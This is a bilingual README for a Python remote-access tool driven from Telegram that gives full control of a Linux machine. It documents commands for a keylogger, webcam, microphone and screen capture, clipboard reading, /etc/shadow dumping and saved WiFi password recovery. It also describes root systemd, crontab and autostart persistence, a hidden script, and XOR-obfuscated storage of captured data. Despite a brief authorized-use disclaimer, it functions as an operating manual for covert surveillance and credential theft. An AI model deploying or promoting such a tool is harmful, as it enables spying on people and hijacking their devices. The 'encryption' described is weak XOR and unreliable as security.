# 🤖 linux-telegram-bot


<div align="center">

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

*Advanced Telegram-based Remote Administration Tool for Linux*

</div>

---

## ⚠️ Legal Disclaimer

**This software is intended for educational purposes and authorized system administration only.**

- ✅ **Allowed use**: Managing your own devices, penetration testing with explicit written consent, educational research
- ❌ **Prohibited use**: Unauthorized access to computer systems, violating privacy laws, any illegal activities

**The author assumes no responsibility for misuse of this software.**

---

## 📖 Table of Contents | Оглавление

- [English](#english)
  - [📋 Overview](#-overview)
  - [✨ Features](#-features)
  - [🚀 Quick Start](#-quick-start)
  - [📁 File Structure](#-file-structure)
  - [🔐 Security & Encryption](#-security--encryption)
  - [📚 Command Reference](#-command-reference)
  - [⚙️ Configuration](#️-configuration)
  - [🛡️ Persistence Mechanisms](#️-persistence-mechanisms)

- [Русский](#русский)
  - [📋 Обзор](#-обзор)
  - [✨ Возможности](#-возможности)
  - [🚀 Быстрый старт](#-быстрый-старт)
  - [📁 Структура файлов](#-структура-файлов)
  - [🔐 Безопасность и шифрование](#-безопасность-и-шифрование)
  - [📚 Справочник команд](#-справочник-команд)
  - [⚙️ Конфигурация](#️-конфигурация)
  - [🛡️ Механизмы персистентности](#️-механизмы-персистентности)

---

# English

## 📋 Overview

**Linux Telegram Bot** is a comprehensive remote administration tool that provides **full system control** through Telegram messenger.

### Key Capabilities

| Category | Capabilities |
|----------|-------------|
| **System Control** | Reboot, shutdown, sleep, process management, service control |
| **File System** | Browse, upload, download, create, delete, hide, zip, chmod |
| **Network** | IP config, route table, ARP cache, netstat, WiFi scanning/passwords |
| **User Interface** | Screenshot, webcam capture, audio recording, mouse/keyboard control |
| **Surveillance** | Keylogger, clipboard monitoring, message display |
| **Persistence** | Systemd service, crontab, autostart, environment variables |
| **Security** | User management, app blocking, website blocking, SHADOW dump |
| **Information** | Full systeminfo (CPU, GPU, RAM, disks, battery, BIOS, etc.) |

### Architecture

```
Telegram Bot API ←→ Python Bot ←→ System Commands
                         ↓
                   Encrypted Storage
                   (config, sessions, logs)
```

## ✨ Features

### Core Features

| Feature | Description |
|---------|-------------|
| 🔐 **Password Protection** | SHA256 password hash verification |
| 🔑 **Session Management** | Encrypted user sessions with auto-cleanup |
| 📦 **Auto-Dependency** | Automatic pip install of required libraries |
| 🔄 **Self-Healing** | Auto-recovery from crashes, file corruption |
| 🎨 **Colored Output** | Formatted tables via `tabulate` |
| 📄 **File Transfer** | Upload/download any file size |
| 🔒 **Encrypted Storage** | XOR-based encryption for all sensitive data |

### System Commands

| Command | Description |
|---------|-------------|
| `systeminfo` | Full hardware/software inventory |
| `lshw` | Detailed hardware information |
| `dmesg` | Kernel ring buffer messages |
| `ps` | Process list with CPU/MEM usage |
| `kill` | Terminate processes |
| `run` | Launch applications/files |
| `cmd` | Execute shell commands |
| `time` / `date` | Get/set system time/date |
| `sleep` / `reboot` / `shutdown` | Power management |

### File System Commands

| Command | Description |
|---------|-------------|
| `pwd` / `cd` | Navigate directories |
| `ls` | List files with permissions, owner, size |
| `mkfile` / `mkdir` | Create files/directories |
| `rn` | Rename files/directories |
| `rm` / `rmdir` | Delete files/directories |
| `cp` / `mv` | Copy/move files |
| `chmod` | Change permissions |
| `hide` / `unhide` | Hide/unhide files (dot prefix) |
| `cat` | Download files |
| `zip` | Create archive of current directory |

### Network Commands

| Command | Description |
|---------|-------------|
| `inet` | Enable/disable internet |
| `ipconfig` | Global IP info + local interfaces |
| `route` | IPv4/IPv6 routing tables |
| `arp` | ARP cache |
| `netstat` | Active network connections |
| `wifi` | Scan WiFi networks / get saved passwords |
| `site` | Open/download/block websites |

### User Interface Commands

| Command | Description |
|---------|-------------|
| `screen` | Screenshot (PNG) |
| `webcam` | Webcam capture |
| `audio` | Record/play audio (microphone/system) |
| `mouse` | Move, click, scroll |
| `keyboard` | Type, press keys, remap, block keys |
| `clipboard` | Read/write/clear clipboard |
| `msg` | Display notifications/message boxes |
| `keylogger` | Enable/disable/retrieve keystrokes |

### Persistence Commands

| Command | Description |
|---------|-------------|
| `service` | Create/manage systemd services |
| `crontab` | Schedule tasks |
| `startup` | Add to autostart (.desktop files) |
| `env` | Set environment variables |
| `autostart` | Bot's internal autostart system |

### Security Commands

| Command | Description |
|---------|-------------|
| `user` | Create/delete/list users |
| `block` | Block/unblock applications |
| `hashpass` | Dump /etc/shadow |
| `setuid` | Switch UID |
| `account` | Manage connected sessions |

## 🚀 Quick Start

### 📋 Prerequisites

```bash
# Install required system packages
sudo apt install python3 python3-pip python3-venv \
    ffmpeg xdotool xmessage libnotify-bin \
    net-tools iproute2 nmcli lshw
```

### 📥 Installation

```bash
git clone https://github.com/vk-candpython/linux-telegram-bot.git
cd linux-telegram-bot
```

### ⚙️ Configuration

Edit `bot.py` and set:

```python
#-------------------------|NECESSARILY|-------------------------#
TOKEN = "YOUR_BOT_TOKEN"           # From @BotFather
PASSWORD = "YOUR_PASSWORD_HASH"    # SHA256 of your password
SEED = 12345                       # Random seed for encryption
PATH = "/opt/mybot"                # Installation directory
#-----------------------------|END|-----------------------------#

#-------------------------|OPTIONAL|-------------------------#
BOT_SERVICE_NAME = "mybot"         # Systemd service name
BOT_SERVICE_DESCRIPTION = "My Bot" # Service description
BOT_EXE = True                     # Run as persistent service
#----------------------------|END|---------------------------#
```

### 🔐 Generate Password Hash

```bash
python3 -c "from hashlib import sha256; print(sha256('YOUR_PASSWORD'.encode()).hexdigest())"
```

### 🏃 Run

```bash
# Normal mode
sudo python3 bot.py

# Persistent mode (with BOT_EXE=True)
sudo python3 bot.py --root
```

## 📁 File Structure

```
/opt/mybot/                          # PATH
├── bot.py                           # Main script (hidden if BOT_EXE=True)
├── mem/                             # Session storage
│   └── {encrypted_user_id}          # One file per verified user
├── sys/                             # System files
│   ├── config/                      # Encrypted configs
│   │   ├── 0x66f4777938a79111       # TOKEN (encrypted)
│   │   ├── 0x7dc0a72554c7035d       # PASSWORD (encrypted)
│   │   └── 0x6e17263f779dce5a       # SEED
│   ├── .init.sh                     # Service launcher
│   └── 0x79f2d2686b6da01e           # Autostart entries (encrypted)
├── tmp/                             # Temporary files
│   ├── 0x1f95051e7493c896           # Blocked apps list
│   ├── 0x4b0944084a778666           # Keylogger data
│   ├── 0x59cb2f485e387a63           # Webcam screenshot temp
│   └── 0x78df1954620311d6           # Audio recording temp
├── share/                           # Uploaded/downloaded files
└── .venv/                           # Python virtual environment
```

## 🔐 Security & Encryption

### Encryption Algorithm

```python
def encrypt(data):
    k0, k1 = KEY  # Generated from SEED
    f = 0
    
    for i, c in enumerate(data):
        n = ord(c)
        x = (n << k0) ^ (((k1 + f) + i) & 0xFF)
        f = (f ^ x) & 0xFF
        yield chr(x)
```

**Properties:**
- XOR-based stream cipher with feedback
- Key derived from `SEED` (randint(1,8), randint(1,256))
- Each encrypted byte depends on position, key, and previous state
- Used for: TOKEN, PASSWORD, autostart entries, sessions, keylogger data

### Session Management

- Each verified user gets encrypted session file in `mem/`
- Filename = `mem_id(user_id)` = `(user_id << k0) ^ k1`
- Session contains: `@{username}={date}`
- Sessions persist until explicit `exit` command

## 📚 Command Reference

### Core Commands

| Command | Syntax | Example |
|---------|--------|---------|
| `help` | `help` | Shows all commands |
| `session` | `session` | Session information |
| `getpid` | `getpid` | Current PID |
| `getuid` | `getuid` | Current user |
| `setuid` | `setuid 1000` | Switch to UID 1000 |
| `restart` | `restart` | Restart bot |
| `exit` | `exit` | Log out |

### File System Examples

```bash
# List directory
ls

# Change directory
cd /home/user

# Create file with content
mkfile test.txt -d Hello\tWorld\n

# Create directory
mkdir new_folder

# Rename
rn old.txt -n new.txt

# Copy
cp source.txt -t /dest/folder/

# Hide file
hide secret.txt

# Download file
cat document.pdf
```

### Network Examples

```bash
# Get IP info
ipconfig

# Scan WiFi
wifi -g

# Get saved WiFi passwords
wifi -p

# Block website
site -b example.com

# Download from URL
site -d https://example.com/file.pdf -n downloaded.pdf
```

### System Examples

```bash
# Full system info
systeminfo

# Process list
ps

# Kill process
kill firefox
kill 1234

# Execute command
cmd -g "ls -la"

# Create service
service -c myservice -d "My Service" -p /path/to/script -a "arg1 arg2" -u root

# Create cron job (every hour)
crontab -c mytask -e "0 * * * *" -u user -p /path/to/script -a none
```

### UI Examples

```bash
# Screenshot
screen

# Webcam capture
webcam

# Record 10 seconds from microphone
audio -m 10

# Play audio file
audio -s /path/to/audio.mp3

# Move mouse
mouse -x 500 -y 300 -d 1

# Click left button 2 times
mouse -l -c 2 -d 1

# Type text
keyboard -t "Hello World" -d 1

# Press key 3 times
keyboard -k enter -p 3 -d 1

# Remap key
keyboard -c -k a -n b

# Block key
keyboard -b f12

# Get clipboard
clipboard -g

# Show notification
msg -p "Title" -t "Message text"
```

### Keylogger Examples

```bash
# Enable
keylogger -e

# Status
keylogger -s

# Get data (raw)
keylogger -g base

# Get data (characters only)
keylogger -g char

# Get data (with hotkey tags)
keylogger -g hotkey

# Disable
keylogger -d

# Clear data
keylogger -r
```

## ⚙️ Configuration

### Runtime Config Changes

```bash
# View current config
config -g

# Change TOKEN
config TOKEN -s 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz

# Change PASSWORD
config PASSWORD -s newpassword

# Change SEED
config SEED -s 54321

# Reset TOKEN
config -r TOKEN
```

### Account Management

```bash
# List connected accounts
account -g

# Delete account
account -d 123456789
```

## 🛡️ Persistence Mechanisms

### 1. Systemd Service (BOT_EXE=True)

Creates service at `/etc/systemd/system/{name}.service`:
```ini
[Unit]
Description={description}

[Service]
Type=simple
ExecStart="{PATH}/sys/.init.sh"
User=root
Restart=always

[Install]
WantedBy=multi-user.target
```

### 2. Internal Autostart

Files to launch on bot startup:
```bash
autostart -c name -p /path/to/file -a "args"
autostart -l
autostart -d name
```

### 3. Crontab Integration

```bash
crontab -c name -e "*/5 * * * *" -u root -p /script -a none
```

### 4. User Autostart

```bash
startup -c name -p /path/to/file -a none
```

### 5. Environment Variables

```bash
env -c MY_VAR -v "my value"
```

---

# Русский

## 📋 Обзор

**Linux Telegram Bot** — это комплексный инструмент удалённого администрирования, предоставляющий **полный контроль над системой** через мессенджер Telegram.

### Ключевые возможности

| Категория | Возможности |
|-----------|-------------|
| **Управление системой** | Перезагрузка, выключение, сон, управление процессами и службами |
| **Файловая система** | Навигация, загрузка, скачивание, создание, удаление, скрытие, архивация |
| **Сеть** | IP-конфигурация, таблицы маршрутизации, ARP-кэш, netstat, WiFi |
| **Интерфейс пользователя** | Скриншоты, веб-камера, запись звука, управление мышью/клавиатурой |
| **Наблюдение** | Кейлоггер, мониторинг буфера обмена, отображение сообщений |
| **Персистентность** | Systemd-службы, crontab, автозагрузка, переменные окружения |
| **Безопасность** | Управление пользователями, блокировка приложений/сайтов, дамп SHADOW |

## ✨ Возможности

### Основные возможности

| Возможность | Описание |
|-------------|----------|
| 🔐 **Защита паролем** | Проверка SHA256 хеша пароля |
| 🔑 **Управление сессиями** | Зашифрованные файлы сессий с автоочисткой |
| 📦 **Авто-зависимости** | Автоматическая установка pip-библиотек |
| 🔄 **Самовосстановление** | Автовосстановление после сбоев |
| 🎨 **Цветной вывод** | Форматированные таблицы через `tabulate` |
| 📄 **Передача файлов** | Загрузка/скачивание файлов любого размера |
| 🔒 **Шифрованное хранение** | XOR-шифрование всех чувствительных данных |

## 🚀 Быстрый старт

### 📋 Требования

```bash
sudo apt install python3 python3-pip python3-venv \
    ffmpeg xdotool xmessage libnotify-bin \
    net-tools iproute2 nmcli lshw
```

### ⚙️ Конфигурация

Отредактируй `bot.py`:

```python
TOKEN = "ТВОЙ_ТОКЕН_БОТА"           # От @BotFather
PASSWORD = "ХЕШ_ПАРОЛЯ"             # SHA256 твоего пароля
SEED = 12345                        # Случайное зерно для шифрования
PATH = "/opt/mybot"                 # Директория установки
```

### 🔐 Генерация хеша пароля

```bash
python3 -c "from hashlib import sha256; print(sha256('ТВОЙ_ПАРОЛЬ'.encode()).hexdigest())"
```

### 🏃 Запуск

```bash
sudo python3 bot.py
```

## 📚 Справочник команд

### Основные команды

| Команда | Описание |
|---------|----------|
| `help` | Показать все команды |
| `session` | Информация о сессии |
| `getpid` | Текущий PID |
| `getuid` | Текущий пользователь |
| `setuid 1000` | Переключиться на UID 1000 |
| `restart` | Перезапустить бота |
| `exit` | Выйти из сессии |

### Файловая система

```bash
ls                              # Список файлов
cd /home/user                   # Сменить директорию
mkfile test.txt -d "содержимое" # Создать файл
mkdir new_folder                # Создать папку
rn old.txt -n new.txt           # Переименовать
cp source.txt -t /dest/         # Копировать
hide secret.txt                 # Скрыть файл
cat document.pdf                # Скачать файл
```

### Сеть

```bash
ipconfig                # Информация об IP
wifi -g                 # Сканировать WiFi
wifi -p                 # Сохранённые пароли WiFi
site -b example.com     # Заблокировать сайт
site -d URL -n file.pdf # Скачать с сайта
```

### Система

```bash
systeminfo              # Полная информация о системе
ps                      # Список процессов
kill firefox            # Завершить процесс
cmd -g "ls -la"         # Выполнить команду
service -c name -d "desc" -p /path -a "args" -u root  # Создать службу
```

### Интерфейс

```bash
screen                  # Скриншот
webcam                  # Снимок с веб-камеры
audio -m 10             # Запись с микрофона (10 сек)
mouse -x 500 -y 300 -d 1  # Переместить мышь
keyboard -t "Привет" -d 1  # Напечатать текст
clipboard -g            # Прочитать буфер обмена
msg -p "Заголовок" -t "Текст"  # Показать уведомление
```

### Кейлоггер

```bash
keylogger -e            # Включить
keylogger -s            # Статус
keylogger -g base       # Получить данные (сырые)
keylogger -g char       # Только символы
keylogger -d            # Выключить
keylogger -r            # Очистить данные
```

---

<div align="center">

**[⬆ Back to Top](#-linux-telegram-bot)**

*Remote Administration via Telegram — Full Linux Control*

</div>
